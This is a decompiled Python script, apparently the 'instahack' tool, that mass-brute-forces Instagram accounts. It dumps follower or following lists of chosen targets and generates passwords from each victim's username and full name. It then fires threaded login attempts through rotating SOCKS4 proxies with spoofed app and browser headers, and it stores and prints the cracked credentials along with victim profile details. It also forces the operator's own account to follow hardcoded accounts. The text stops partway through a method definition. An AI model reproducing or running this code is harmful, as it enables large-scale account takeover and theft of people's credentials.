""" Decompiled by Exotic Hridoy """

"\n@toolname: instahack\n@version : v1.0.4 (latest)\n@authors : Moh Iqbal Hidayat (@iqbalmh18)\n@donate  : https://paypal.me/iqbalmh18\n@github  : https://github.com/termuxhackers-id/instahack/\n@support : https://instagram.com/termuxhackers.id\n"
R="[1;31m"; G="[1;32m"; Y="[1;33m"; B="[1;34m"; D="[2;37m"; W="[0m"; C="[2;36m"; U="[4m"

try:
    import os,re,bs4,time,json,uuid,hmac,base64,random,hashlib,requests,calendar
    from shutil import which
    from bs4 import BeautifulSoup
    from licensing.models import*
    from licensing.methods import Key,Helpers
    from concurrent.futures import ThreadPoolExecutor
    from requests.exceptions import ConnectionError,JSONDecodeError
except(ImportError,ModuleNotFoundError):
    exit(f'''
    {R}this tool is require module bs4 and requests
    run python3 -m pip install bs4 requests licensing
    to install the requirements{W}
    ''')

IHACK=f'{W}[{C}ihack{W}]'
ERROR=f'{W}[{R}error{W}]'
DATADIR="data"
USERDIR=DATADIR+"/user"
RESTDIR=DATADIR+"/rest"
PRODUCTFILE=USERDIR+"/product.id"
PROXIESFILE=USERDIR+"/proxies.list"
COOKIESFILE=USERDIR+"/cookies.json"
LICENSEFILE=USERDIR+"/license.json"
RESULTSFILE=RESTDIR+"/{}.txt"
BANNERSFILE=USERDIR+"/ihack.art"
LISTDIR=[DATADIR,USERDIR,RESTDIR]
for DIR in LISTDIR:
    if not os.path.isdir(DIR):
        os.mkdir(DIR)

class Cryptolens:
    def __init__(self):
        try:self.productid=open(PRODUCTFILE,"r").read()
        except FileNotFoundError:self.productid=None
        self.machinecode=Helpers.GetMachineCode(v=2)
    def check(self):
        try:
            key=json.loads(open(LICENSEFILE,"r").read())["key"]
        except(json.decoder.JSONDecodeError,FileNotFoundError):
            if os.path.isfile(LICENSEFILE):os.remove(LICENSEFILE)
            print(f'''
{IHACK} LICENSE KEY

        this tool is require license key
        type {Y}get{W} to get your license key
        or contact the author from instagram (DM)

        {U}https://www.instagram.com/iqbalmh18{W}
            ''')
            while True:
                key=str(input(f'{IHACK} enter license key: '))
                if key.lower()=="get":self.getkey()
                else:break
        verify=self.verify(key)
        if verify["status"]:
            with open(LICENSEFILE,"a")as file:
                file.truncate(0)
                file.write(json.dumps(verify,indent=4))
                file.close()
            print(f'{IHACK} using stored key {R}->{Y} {LICENSEFILE}{W}')
            return verify
        else:
            if os.path.isfile(LICENSEFILE):
                os.remove(LICENSEFILE)
            exit(f'{ERROR} license error {R}-> {verify["message"].lower()}{W}')
    def getkey(self):
        url=f'https://wa.me/6285892380620?text=register+ihack-v1.0.4+*{self.machinecode}*'
        print(f'{IHACK} please open the link on your browser:')
        print(f'        {Y}{url}{W}')
        if which("xdg-open"):
            os.system(f'xdg-open {url}')
    def verify(self,key):
        license=Key.activate(
            token="WyIzNjAyNzk0MSIsIlBpcksrK0V3VkdaUnJGV01wb29kd1MwdUpHdit5R1E4L1V3aHY2TEQiXQ==",
            rsa_pub_key="<RSAKeyValue><Modulus>2EjTaKiT62xsl9v+HbE5I61MnDoUBEPwjuWv2W4J+ECzjfqFDVIvSvNB6j5eXgW4rL+2bRaisW1RbJXjUhqWr7GVBnTA3s2i7hmCnO4aWb7ushXf3CjqYJKqYcD0jNM+v7jUjJ4xCxzbNOJGNNWRvOkRHkhec2yLxMCETYf/S7Ms3oIrAnI+4L2YirT+E01sO7UiNDOMR0XwxgBE4oyDn5AFPHeu91RA60FxKqy0KyH1nZydWtOL+rA3K9dn6cgcf3h668A7Lt1WkOoH8O3qFZ/JHoTAkKMrWkmszABht3xm5lvS4/2ArycxCLaF9qONPTaNynNsiuAmWmjhuaN4bw==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>",
            product_id=self.productid,
            key=key,
            machine_code=self.machinecode)
        if license[0]==None or not Helpers.IsOnRightMachine(license[0],v=2):return{"status":False,"message":license[1].lower()}
        else:return{"status":True,"machine":self.machinecode,"premium":license[0].f1,"created":str(license[0].created),"expires":str(license[0].expires),"key":key}
cryptolens=Cryptolens()

class instahackv1_0_4:
    def __init__(self):
        self.ok=[]
        self.cp=[]
        self.ko=[]
        self.license=cryptolens.check()
        self.proxies=self.updateproxy()
        self.cookies=self.login()
    def useragentapi(self):
        android_cph=["CPH1853","CPH1803","CPH1893","CPH2071","CPH1717","CPH1937","CPH1923","CPH1725","CPH1909","CPH1613","CPH1989","CPH1907","CPH2015","CPH2083"]
        android_version=["12","11","10","9","8.1.0","7.1.1","6.0.1","4.4.4","5.1.1","5.1"]
        a=random.choice(android_cph)
        b=random.randrange(73,99)
        c=random.randrange(4200,4900)
        d=random.randrange(40,150)
        e=random.choice(android_version)
        f=random.randrange(4,99)
        g=random.randrange(3,10)
        h=random.randrange(111111,199999)
        i=random.randrange(1,9)
        useragent=f'Mozilla/5.0 (Linux; U; Android {e}; en-us; {a} SM-G965N Build/QP1A.190711.020; {h}.0{i}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{b}.0.{c}.{d} Mobile Safari/537.36 OppoBrowser/{f}.{g}.1.{g}'
        return useragent
    def useragentapp(self):
        useragent_list=["Instagram {} Android (29/{}; 420dpi; 1080x1920; OPPO; Oppo Reno 4 Pro; CPH2109; qcom; in_ID; 208061712)","Instagram {} Android (29/{}; 420dpi; 1080x2340; OnePlus; GM1903; OnePlus7; qcom; in_ID; 208061712)","Instagram {} Android (28/{}; 420dpi; 1080x1920; OnePlus; ONEPLUS A3003; OnePlus3; qcom; in_ID; 208061712)","Instagram {} Android (26/{}; 640dpi; 1440x2560; samsung; SM-G930F; herolte; samsungexynos8890; in_ID; 208061712)","Instagram {} Android (24/{}; 640dpi; 1440x2560; HUAWEI; LON-L29; HWLON; hi3660; in_ID; 208061712)"]
        android_version=["12","11","10","9","8.1.0","7.1.1","6.0.1","4.4.4","5.1.1","5.1"]
        instagram_version=["10.1.0","10.1.0","10.1.0","10.1.0","10.2.0","10.2.0","10.2.0","10.2.1","10.3.0","10.3.0","10.34.0","10.34.0","100.0.0.17.129","101.0.0.15.120","102.0.0.20.117","103.0.0.15.119","103.1.0.15.119","104.0.0.21.118","105.0.0.18.119","106.0.0.24.118","107.0.0.27.121","108.0.0.23.119","109.0.0.18.124","11.0.0.1.20","11.0.0.11.20","11.0.0.12.20","11.0.0.3.20","110.0.0.16.119","111.0.0.24.152","111.1.0.25.152","112.0.0.29.121","113.0.0.38.122","114.0.0.38.120","116.0.0.34.121","117.0.0.28.123","12.0.0.2.91","12.0.0.4.91","12.0.0.5.91","120.0.0.29.118","121.0.0.29.119","122.0.0.29.238","123.0.0.21.114","125.0.0.20.126","126.0.0.25.121","127.0.0.30.121","128.0.0.26.128","129.0.0.29.119","13.0.0.1.91","130.0.0.31.121","131.0.0.23.116","131.0.0.25.116","132.0.0.26.134","133.0.0.32.120","134.0.0.26.121","135.0.0.28.119","136.0.0.34.124","15.0.0.11.90","15.0.0.5.90","15.0.0.9.90","16.0.0.1.90","16.0.0.11.90","16.0.0.13.90","16.0.0.5.90","17.0.0.14.91","17.0.0.2.91","17.0.0.5.91","19.1.0.31.91","20.0.0.10.75","20.0.0.19.75","20.0.0.29.75","20.0.0.29.75","21.0.0.1.62","21.0.0.11.62","21.0.0.3.62","21.0.0.8.62","22.0.0.3.68","23.0.0.14.135","25.0.0.1.136","25.0.0.11.136","25.0.0.20.136","25.0.0.26.136","26.0.0.1.86","26.0.0.10.86","26.0.0.13.86","26.0.0.5.86","27.0.0.11.97","27.0.0.2.97","27.0.0.7.97","27.0.0.9.97","28.0.0.2.284","28.0.0.6.284","28.0.0.7.284","28.0.0.7.284","29.0.0.1.95","29.0.0.13.95","29.0.0.3.95","29.0.0.7.95","30.0.0.1.95","30.0.0.10.95","30.0.0.12.95","30.0.0.5.95","31.0.0.1.94","31.0.0.10.94","31.0.0.4.94","31.0.0.9.94","32.0.0.1.94","32.0.0.14.94","32.0.0.16.94","32.0.0.7.94","33.0.0.1.92","33.0.0.11.92","33.0.0.5.92","33.0.0.8.92","34.0.0.10.93","34.0.0.12.93","34.0.0.3.93","34.0.0.4.93","35.0.0.14.96","35.0.0.20.96","35.0.0.3.96","35.0.0.7.96","36.0.0.3.91","36.0.0.7.91","37.0.0.15.97","37.0.0.21.97","38.0.0.12.95","38.0.0.13.95","38.0.0.3.95","38.0.0.7.95","39.0.0.12.93","39.0.0.16.93","39.0.0.19.93","39.0.0.4.93","40.0.0.12.95","40.0.0.3.95","40.0.0.7.95","41.0.0.10.92","42.0.0.17.95","42.0.0.19.95","42.0.0.2.95","48.0.0.15.98","49.0.0.15.89","5.0.8","5.1.7","51.0.0.20.85","52.0.0.8.83","53.0.0.13.84","54.0.0.14.82","54.0.0.14.82","55.0.0.12.79","59.0.0.23.76","6.10.1","6.11.2","6.12.0","6.12.1","6.12.2","6.13.0","6.13.1","6.13.3","6.14.0","6.14.0","6.14.1","6.15.0","6.15.0","6.15.0","6.16.0","6.16.0","6.16.0","6.16.1","6.17.0","6.17.0","6.17.1","6.18.0","6.18.0","6.18.0","6.18.0","6.19.0","6.19.0","6.19.0","6.19.0","6.20.0","6.20.0","6.20.1","6.20.1","6.20.2","60.0.0.16.79","60.1.0.17.79","63.0.0.17.94","63.0.0.17.94","64.0.0.14.96","67.0.0.24.100","7.0.0","7.0.0","7.1.0","7.1.0","7.1.1","7.2.0","7.2.0","7.2.0","7.2.1","7.2.2","7.2.3","7.2.4","7.3.0","7.3.0","7.3.0","7.3.0","7.5.0","7.5.0","7.5.0","7.5.1","7.5.2","7.6.0","7.6.0","7.6.0","7.6.1","7.7.0","7.7.0","7.7.0","7.7.0","7.7.0","7.8.0","7.8.0","70.0.0.21.98","70.0.0.22.98","71.0.0.18.102","73.0.0.22.185","75.0.0.23.99","76.0.0.15.395","78.0.0.11.104","8.1.0","8.1.0","8.1.0","8.1.0","8.2.0","8.2.0","8.2.0","8.2.0","8.5.0","8.5.0","8.5.0","8.5.1","80.0.0.14.110","82.0.0.13.119","83.0.0.20.111","84.0.0.21.105","85.0.0.21.100","86.0.0.19.87","86.0.0.24.87","88.0.0.14.99","9.0.0","9.0.0","9.0.0","9.1.5","9.1.5","9.2.0","9.2.0","9.2.0","9.2.0","9.2.0","9.2.5","9.2.5","9.2.5","90.0.0.18.110","91.0.0.18.118","92.0.0.15.114","93.1.0.19.102","94.0.0.22.116","95.0.0.21.124","96.0.0.28.114","99.0.0.32.182"]
        return random.choice(useragent_list).format(random.choice(instagram_version),random.choice(android_version))
    def updateproxy(self):
        update=str(input(f'{IHACK} do you want to update proxies? (y/n): '))
        if update.lower()in("y","yes"):
            response=requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all").text
            with open(PROXIESFILE,"a")as file:
                file.truncate(0)
                file.write(response)
                file.close()
            print(f'{IHACK} proxies have been updated {R}->{G} {str(len(response.splitlines()))} socks4{W}')
        else:print(f'{IHACK} using stored proxies {R}->{Y} {PROXIESFILE}{W}')
    def follow(self,cookie):
        try:
            userid=re.search("ds_user_id=(.*?);",cookie).group(1)
            sessionid=re.search("sessionid=(.*?);",cookie).group(1)
            headers={
                "accept":"*/*",
                "accept-encoding":"gzip, deflate, br",
                "accept-language":"en-US,en;q=0.9",
                "content-length":"0",
                "content-type":"application/x-www-form-urlencoded",
                "cookie":"ig_did=F839D900-5ECC-4392-BCAD-5CBD51FB9228; mid=YChlyQALAAHp2POOp2lK_-ciAGlM; ig_nrcb=1; csrftoken=W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r; ds_user_id="+userid+"; sessionid="+sessionid,
                "origin":"https://www.instagram.com",
                "referer":"https://www.instagram.com/",
                "sec-fetch-dest":"empty",
                "sec-fetch-mode":"cors",
                "sec-fetch-site":"same-origin",
                "user-agent":self.useragentapi(),
                "x-csrftoken":"W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r",
                "x-ig-app-id":"4080970862",
                "x-ig-www-claim":"hmac.AR0OQY4Gw4kczWNvfVOhvoljSINqB2u2gB-utUQ1MF0Mkrzu",
                "x-instagram-ajax":"95bfef5dd816",
                "x-requested-with":"XMLHttpRequest"}
            with requests.Session()as r:
                for author in["4080970862","6862913743"]:
                    post=r.post(f'https://www.instagram.com/web/friendships/{author}/follow/',headers=headers).text
                if "\"status\":\"ok\"" in str(post):return{"status":True,"cookies":cookie}
                else:return{"status":False,"cookies":cookie}
        except AttributeError:
            exit(f'{ERROR }login failed cookies are invalid or have been expires')
    def login(self):
        try:
            cookie=json.loads(open(COOKIESFILE,"r").read())["cookies"]
        except(json.decoder.JSONDecodeError,FileNotFoundError):
            print(f'''
{IHACK} INSTAGRAM COOKIES

        this tool is require instagram cookies
        get your own cookies with cookiedough extension

        {U}https://google.com/search?q=cookie+dough+extension{W}
            ''')
            while True:
                try:
                    cookie=str(input(f'{IHACK} instagram cookies: '))
                    if re.search("sessionid=(.*?);",cookie).group(1):break
                except:print(f'{ERROR} please fill instagram cookies correctly!')
        follow=self.follow(cookie)
        if follow["status"]:
            with open(COOKIESFILE,"a")as file:
                file.truncate(0)
                file.write(json.dumps({"cookies":cookie},indent=4))
                file.close()
            print(f'{IHACK} using stored cookies {R}->{Y} {COOKIESFILE}{W}')
            return cookie
        else:
            if os.path.isfile(COOKIESFILE):
                os.remove(COOKIESFILE)
            return self.login()
    def info(self,username):
        try:
            r=requests.Session()
            url=f'https://www.instagram.com/{username}/?__a=1&__d=1'
            response=r.get(
                url,
                headers={"user-agent":self.useragentapi()},
                cookies={"cookie":self.cookies}
).json()["graphql"]["user"]
            if response:
                return{
                    "status":True,
                    "fbid":response["fbid"],
                    "userid":response["id"],
                    "private":response["is_private"],
                    "verified":response["is_verified"],
                    "username":response["username"],
                    "fullname":response["full_name"],
                    "biography":response["biography"],
                    "follower":response["edge_followed_by"]["count"],
                    "followed":response["edge_follow"]["count"],
                    "feedpost":response["edge_owner_to_timeline_media"]["count"],
                    "picture":response["profile_pic_url_hd"]}
            else:return{"status":False}
        except KeyError:return{"status":False}
    def wordlist(self,username,fullname):
        password=[]
        digit=[]
        for user in username:
            if user.isdigit():digit.append(user)
        digit="".join(digit)
        password.append(username.replace(".","").replace("_",""))
        password.append(username.replace(".","").replace("_","").replace(digit,"")+"123")
        names=fullname.split(" ")
        count=int(len(names))
        while count:
            count-=1
            alpha=[]
            for name in names[count]:
                if name.isalpha():alpha.append(name)
            alpha="".join(alpha)
            if len(digit)!=0:
                password.append(alpha+digit)
            password.append(alpha+"123")
        return list(set(password))
    def dumper(self,mode,usid):
        data=[]
        maxid=None
        while True:
            try:
                r=requests.Session()
                url="https://i.instagram.com/api/v1/friendships/{}/{}/?count={}"
                xxx=("5000" if maxid is None else "200&max_id="+maxid)
                get=r.get(
                    url.format(usid,mode,xxx),
                    headers={"user-agent":self.useragentapp()},
                    cookies={"cookie":self.cookies}
).json()
                for x in get["users"]:
                    try:
                        targetuser=x["username"]
                        targetname=x["full_name"]
                        data.append(targetuser+"="+targetname)
                        print(f'{IHACK} dump from {mode} {R}->{G} {str(len(data))} accounts{W}     ',end="\r")
                    except JSONDecodeError:continue
                try:maxid=get["next_max_id"]
                except KeyError:break
            except KeyError:break
        print(W)
        return list(set(data))
    def dump(self,targetlist):
        data=[]
        print(f'''
        {C}01{W} dump from followers {C}get data from follower list{W}
        {C}02{W} dump from following {C}get data from followed list{W}
        ''')
        mode=str(input(f'{IHACK} select dump menu: '))
        if mode in("1","01"):mode="followers"
        else:mode="following"
        for target in targetlist:
            dumpdata=self.dumper(mode,self.info(target)["userid"])
            for line in dumpdata:
                data.append(line)
            print(f'{IHACK} dump complete total results {R}-> {G}{str(len(data))}{W}')
        print(f'''
        {C}01{W} bruteforce method instagram api {W}({R}OLD{W})
        {C}02{W} bruteforce method instagram app {W}({G}NEW{W})
        ''')
        method=str(input(f'{IHACK} select method: '))
        if method in("1","01"):self.bruteforceAPI(data)
        else:self.bruteforceAPP(data)
    def bruteforceAPI(self,data):
        with ThreadPoolExecutor(max_workers=35)as brute:
            for line in data:
                try:
                    username=line.split("=")[0]
                    fullname=line.split("=")[1]
                    password=self.wordlist(username,fullname)
                    brute.submit(self.attackAPI,username,password)
                except IndexError:continue
    def bruteforceAPP(self,data):
        with ThreadPoolExecutor(max_workers=35)as brute:
            for line in data:
                try:
                    username=line.split("=")[0]
                    fullname=line.split("=")[1]
                    password=self.wordlist(username,fullname)
                    brute.submit(self.attackAPP,username,password)
                except IndexError:continue
    def attackAPI(self,username,passlist):
        self.ko.append(username)
        ok=RESULTSFILE.format("ok-"+time.strftime("%d%m%y"))
        cp=RESULTSFILE.format("cp-"+time.strftime("%d%m%y"))
        for password in passlist:
            try:
                r=requests.Session()
                password=password.lower()
                sock=random.choice(open(PROXIESFILE,"r").read().splitlines())
                prox={"http":f'socks4://{sock}'}
                link="https://z-p42.www.instagram.com/accounts/login/{}"
                ajax=r.get(link.format(""))
                csrftoken=ajax.cookies["csrftoken"]
                r.headers.update({
                    "Host":"z-p42.www.instagram.com",
                    "X-IG-App-ID":"1217981644879628",
                    "X-IG-WWW-Claim":"0",
                    "X-Instagram-AJAX":random.choice(["e776ba0cb975","c6412f1b1b7b","95bfef5dd816"]),
                    "Content-Type":"application/x-www-form-urlencoded",
                    "Content-Lenght":"0",
                    "Cache-Control":"no-cache",
                    "Accept":"*/*",
                    "X-Requested-With":"XMLHttpRequest",
                    "X-ASBD-ID":str(random.randrange(198387,198599)),
                    "User-Agent":self.useragentapi(),
                    "X-CSRFToken":csrftoken,
                    "Sec-Fetch-Site":"same-origin",
                    "Sec-Fetch-Mode":"cors",
                    "Sec-Fetch-Dest":"empty",
                    "Origin":"https://z-p42.www.instagram.com/",
                    "Referer":"https://z-p42.www.instagram.com/accounts/onetap/",
                    "Accept-Encoding":"gzip, deflate, br",
                    "Accept-Language":"en-US;q=0.9,en;q=0.8"})
                data={
                    "username":username,
                    "enc_password":f'#PWD_INSTAGRAM_BROWSER:0:{calendar.timegm(time.gmtime(time.time()))}:{password}',
                    "queryParams":{},
                    "optIntoOneTap":"false",
                    "stopDeletionNonce":"",
                    "trustedDeviceRecords":{}}
                post=r.post(link.format("ajax/"),data=data,proxies=prox,allow_redirects=True)
                if "userId" in post.text:
                    self.ok.append(username+"="+password)
                    open(ok,"a").write(username+"="+password+"\n")
                    info=self.info(username)
                    if info["status"]:
                        print(f'''\n
{IHACK} {G}SUCCESS LOGIN{W}

        {C}fbid{W}: {info["fbid"]}
        {C}userid{W}: {info["userid"]}
        {C}private{W}: {info["private"]}
        {C}verified{W}: {info["verified"]}
        {C}username{W}: {username}
        {C}fullname{W}: {info["fullname"]}
        {C}password{W}: {password}
        {C}follower{W}: {info["follower"]}
        {C}followed{W}: {info["followed"]}
        {C}feedpost{W}: {info["feedpost"]}
        {C}biography{W}: {info["biography"]}

        {C}stored{W}: {G}{ok}{W}
        {C}useragent{W}: {D}{self.useragentapi()}{W}
                        ''')
                        break
                    else:
                        print(f'''\n
{IHACK} {G}SUCCESS LOGIN{W}

        {C}username{W}: {username}
        {C}password{W}: {password}
        
        {C}stored{W}: {G}{ok}{W}
        {C}useragent{W}: {D}{self.useragentapi()}{W}
                        ''')
                        break
                elif "checkpoint_required" in post.text:
                    self.cp.append(username+"="+password)
                    open(cp,"a").write(username+"="+password+"\n")
                    info=self.info(username)
                    if info["status"]:
                        print(f'''\n
{IHACK} {Y}CHECKPOINT LOGIN{W}

        {C}fbid{W}: {info["fbid"]}
        {C}userid{W}: {info["userid"]}
        {C}private{W}: {info["private"]}
        {C}verified{W}: {info["verified"]}
        {C}username{W}: {username}
        {C}fullname{W}: {info["fullname"]}
        {C}password{W}: {password}
        {C}follower{W}: {info["follower"]}
        {C}followed{W}: {info["followed"]}
        {C}feedpost{W}: {info["feedpost"]}
        {C}biography{W}: {info["biography"]}

        {C}stored{W}: {Y}{cp}{W}
        {C}useragent{W}: {D}{self.useragentapi()}{W}
                        ''')
                        break
                    else:
                        print(f'''\n
{IHACK} {Y}CHECKPOINT LOGIN{W}

        {C}username{W}: {username}
        {C}password{W}: {password}
        
        {C}stored{W}: {Y}{cp}{W}
        {C}useragent{W}: {D}{self.useragentapi()}{W}
                        ''')
                        break
                elif "ip_block" in post.text or "spam" in post.text:
                    print(f'{ERROR} ip blocked please activate your APN config !     ',end="\r")
                    time.sleep(10)
                    self.attack(username,passlist)
                else:pass
                X=random.choice([R,G,Y,B,D,C,W])
                status=(f'{G}200{W}'if post.status_code<400 else f'{R}400{W}')
                print(f'{IHACK} status: {status} ok: {G}{str(len(self.ok))}{W} cp: {Y}{str(len(self.cp))}{W} ko: {R}{str(len(self.ko))} -> {W}{X}{str(sock.split(":")[0])}{W}     ',end="\r")
            except JSONDecodeError:continue
            except(ConnectionAbortedError,ConnectionRefusedError,ConnectionError):
                print(f'{ERROR} waiting for the internet connection stable !    ',end="\r")
                time.sleep(10)
                self.attack(username,passlist)
    def attackAPP(self,username,passlist):
        self.ko.append(username)
        r=requests.Session()
        log=0
        day=time.strftime("%d%m%y")
        ok=RESULTSFILE.format("ok-"+day)
        cp=RESULTSFILE.format("cp-"+day)
        uid=str(uuid.uuid4())
        sig="46024e8f31e295869a0e861eaed42cb1dd8454b55232d85f6c6764365079374b"
        exp={"id":"","experiments":"ig_android_account_switching,ig_android_upsell_fullname,ig_android_one_click_in_old_flow,ig_android_landing_page_fb_button,ig_fbns_push,ig_android_split_username_reg,ig_android_separate_avatar_upload,ig_android_contact_point_triage,ig_fbns_blocked,ig_android_re_enable_login_button,ig_android_phone_tab_on_left"}
        exp.update({"id":uid})
        experiments=json.dumps(exp)
        hmc=hmac.new(sig.encode("utf-8"),str(experiments).encode("utf=8"),hashlib.sha256).hexdigest()
        testdata={"signed_body":"","ig_sig_key_version":"4"}
        testdata.update({"signed_body":f'{hmc}.{str(experiments)}'})
        testhead={
            "Host":"i.instagram.com",
            "content-length":"516",
            "x-ig-connection-type":"WIFI",
            "x-ig-capabilities":"3Q==",
            "accept-language":"in-id",
            "content-type":"application/x-www-form-urlencoded; charset=UTF-8",
            "user-agent":self.useragentapp(),
            "accept-encoding":"gzip, deflate"}
        try:r.post("https://i.instagram.com/api/v1/qe/sync/",headers=testhead,data=testdata)
        except:pass
        for password in passlist:
            try:
                password=password.lower()
                pid=str(uuid.uuid4)
                sock=random.choice(open(PROXIESFILE,"r").read().splitlines())
                socks={"http":f'socks4://{sock}'}
                android=f'android-{hashlib.md5(str(time.time()).encode()).hexdigest()[:16]}'
                logdata=json.dumps({"phone_id":pid,"_csrftoken":r.cookies["csrftoken"],"username":username,"guid":uid,"device_id":android,"password":password,"login_attempt_count":str(log)})
                newhmac=hmac.new(sig.encode("utf-8"),str(logdata).encode("utf=8"),hashlib.sha256).hexdigest()
                useragent=self.useragentapp()
                headers={
                    "Host":"i.instagram.com",
                    "content-length":"456",
                    "x-ig-connection-type":"MOBILE(LTE)",
                    "x-ig-capabilities":"3Q==",
                    "accept-language":"in-id",
                    "content-type":"application/x-www-form-urlencoded; charset=UTF-8",
                    "user-agent":useragent,
                    "accept-encoding":"gzip, deflate"}
                body="signed_body=#.%7B%22phone_id%22%3A%22#%22%2C%22_csrftoken%22%3A%22#%22%2C%22username%22%3A%22#%22%2C%22guid%22%3A%22#%22%2C%22device_id%22%3A%22#%22%2C%22password%22%3A%22#%22%2C%22login_attempt_count%22%3A%22#%22%7D&ig_sig_key_version=4".split("#")
                data=f'{body[0]}{newhmac}{body[1]}{pid}{body[2]}{r.cookies["csrftoken"]}{body[3]}{username}{body[4]}{uid}{body[5]}{android}{body[6]}{password}{body[7]}{log}{body[8]}'
                resp=r.post("https://i.instagram.com/api/v1/accounts/login/",headers=headers,data=data,proxies=socks)
                if "logged_in_user" in resp.text or "sessionid" in r.cookies.get_dict():
                    self.ok.append(username+"="+password)
                    open(ok,"a").write(username+"="+password+"\n")
                    info=self.info(username)
                    if info["status"]:
                        print(f'''\n
{IHACK} {G}SUCCESS LOGIN{W}

        {C}fbid{W}: {info["fbid"]}
        {C}userid{W}: {info["userid"]}
        {C}private{W}: {info["private"]}
        {C}verified{W}: {info["verified"]}
        {C}username{W}: {username}
        {C}fullname{W}: {info["fullname"]}
        {C}password{W}: {password}
        {C}follower{W}: {info["follower"]}
        {C}followed{W}: {info["followed"]}
        {C}feedpost{W}: {info["feedpost"]}
        {C}biography{W}: {info["biography"]}

        {C}stored{W}: {G}{ok}{W}
        {C}useragent{W}: {D}{useragent}{W}
                        ''')
                        break
                    else:
                        print(f'''\n
{IHACK} {G}SUCCESS LOGIN{W}

        {C}username{W}: {username}
        {C}password{W}: {password}
        
        {C}stored{W}: {G}{ok}{W}
        {C}useragent{W}: {D}{useragent}{W}
                        ''')
                        break
                elif "https://i.instagram.com/challenge" in resp.text:
                    self.cp.append(username+"|"+password)
                    open(cp,"a").write(username+"="+password+"\n")
                    info=self.info(username)
                    if info["status"]:
                        print(f'''\n
{IHACK} {Y}CHECKPOINT LOGIN{W}

        {C}fbid{W}: {info["fbid"]}
        {C}userid{W}: {info["userid"]}
        {C}private{W}: {info["private"]}
        {C}verified{W}: {info["verified"]}
        {C}username{W}: {username}
        {C}fullname{W}: {info["fullname"]}
        {C}password{W}: {password}
        {C}follower{W}: {info["follower"]}
        {C}followed{W}: {info["followed"]}
        {C}feedpost{W}: {info["feedpost"]}
        {C}biography{W}: {info["biography"]}

        {C}stored{W}: {Y}{cp}{W}
        {C}useragent{W}: {D}{useragent}{W}
                        ''')
                        break
                    else:
                        print(f'''\n
{IHACK} {Y}CHECKPOINT LOGIN{W}

        {C}username{W}: {username}
        {C}password{W}: {password}
        
        {C}stored{W}: {Y}{cp}{W}
        {C}useragent{W}: {D}{useragent}{W}
                        ''')
                        break
                elif "ip_block" in resp.text or "spam" in resp.text:
                    print(f'{ERROR} ip blocked please activate your APN config !     ',end="\r")
                    time.sleep(10)
                    self.bruteforceAPI(username,passlist)
                else:pass
                X=random.choice([R,G,Y,B,D,C,W])
                status=(f'{G}200{W}'if "\"message\":\"Kata sandi yang Anda masukkan salah. Silakan coba lagi.\"" in resp.text else f'{R}400{W}')
                print(f'{IHACK} status: {status} ok: {G}{str(len(self.ok))}{W} cp: {Y}{str(len(self.cp))}{W} ko: {R}{str(len(self.ko))} > {W}{X}{str(sock.split(":")[0])}{W}   ',end="\r")
            except JSONDecodeError:continue
            except(ConnectionAbortedError,ConnectionRefusedError,ConnectionError):
                print(f'{ERROR} waiting for the internet connection stable !    ',end="\r")
                time.sleep(10)
                self.bruteforceAPI(username,passlist)
    def checkrest(self):
        okfile=[]
        cpfile=[]
        path=os.listdir(RESTDIR)
        for p in path:
            if p.split("-")[0]=="ok":okfile.append(p)
            elif p.split("-")[0]=="cp":cpfile.append(p)
            else:continue
        print(f'{IHACK} list of files {R}->{W} ok: {G}{str(len(okfile))}{W} cp:{Y}{str(len(cpfile))}{W}')
        print(W)
        print(f'        if you have result ok i suggest to change\n        the account password first and enable')
        print(f'        {R}Two Factor Authenticator{W} ({R}2FA{W})')
        print(W)
        print(f'        {G}RESULT OK{W}')
        print(W)
        if len(okfile)!=0:
            n=0
            for ok in okfile:
                n+=1
                c=str(len(open(RESTDIR+"/"+ok,"r").read().splitlines()))
                number=("0"+str(n)if n<10 else str(n))
                print(f'        {C}{number}{W} {str(ok)} {R}->{G} {c} accounts{W}')
        else:print(f'        {W}oops you dont have results {G}OK{W}')
        print(W)
        print(f'        {Y}RESULT CP{W}')
        print(W)
        if len(cpfile)!=0:
            n=0
            for cp in cpfile:
                n+=1
                c=str(len(open(RESTDIR+"/"+cp,"r").read().splitlines()))
                number=("0"+str(n)if n<10 else str(n))
                print(f'        {C}{number}{W} {str(cp)} {R}->{Y} {c} accounts{W}')
        else:print(f'        {W}oops you dont have results {Y}CP{W}')
        print(W)
        while True:
            file=str(input(f'{IHACK} enter file name: '))
            file=RESTDIR+"/"+file
            if not os.path.isfile(file):continue
            else:break
        for line in open(file,"r").read().splitlines():
            try:
                info=self.info(line.split("=")[0])
                base=os.path.basename(file).split("-")[0]
                if base=="ok":
                    if info["status"]:
                        print(f'''
{IHACK} {G}SUCCESS LOGIN {W}

        {C}fbid{W}: {info["fbid"]}
        {C}userid{W}: {info["userid"]}
        {C}private{W}: {info["private"]}
        {C}verified{W}: {info["verified"]}
        {C}username{W}: {line.split("=")[0]}
        {C}fullname{W}: {info["fullname"]}
        {C}password{W}: {line.split("=")[1]}
        {C}follower{W}: {info["follower"]}
        {C}followed{W}: {info["followed"]}
        {C}feedpost{W}: {info["feedpost"]}
        {C}biography{W}: {info["biography"]}
                        ''')
                        continue
                    else:
                        print(f'''
{IHACK} {G}SUCCESS LOGIN{W}

        {C}username{W}: {line.split("=")[0]}
        {C}password{W}: {line.split("=")[1]}
                        ''')
                        continue
                elif base=="cp":
                    if info["status"]:
                        print(f'''
{IHACK} {Y}CHECKPOINT LOGIN{W}

        {C}fbid{W}: {info["fbid"]}
        {C}userid{W}: {info["userid"]}
        {C}private{W}: {info["private"]}
        {C}verified{W}: {info["verified"]}
        {C}username{W}: {line.split("=")[0]}
        {C}fullname{W}: {info["fullname"]}
        {C}password{W}: {line.split("=")[1]}
        {C}follower{W}: {info["follower"]}
        {C}followed{W}: {info["followed"]}
        {C}feedpost{W}: {info["feedpost"]}
        {C}biography{W}: {info["biography"]}
                        ''')
                        continue
                    else:
                        print(f'''
{IHACK} {Y}CHECKPOINT LOGIN{W}

        {C}username{W}: {line.split("=")[0]}
        {C}password{W}: {line.split("=")[1]}
                        ''')
                        continue
                else:continue
            except JSONDecodeError:continue
            except KeyError:break
        print(f'{IHACK} check results completed {R}->{W} ok file: {G}{str(len(okfile))}{W} cp file: {Y}{str(len(cpfile))}{W}')
    def instarecon(self):
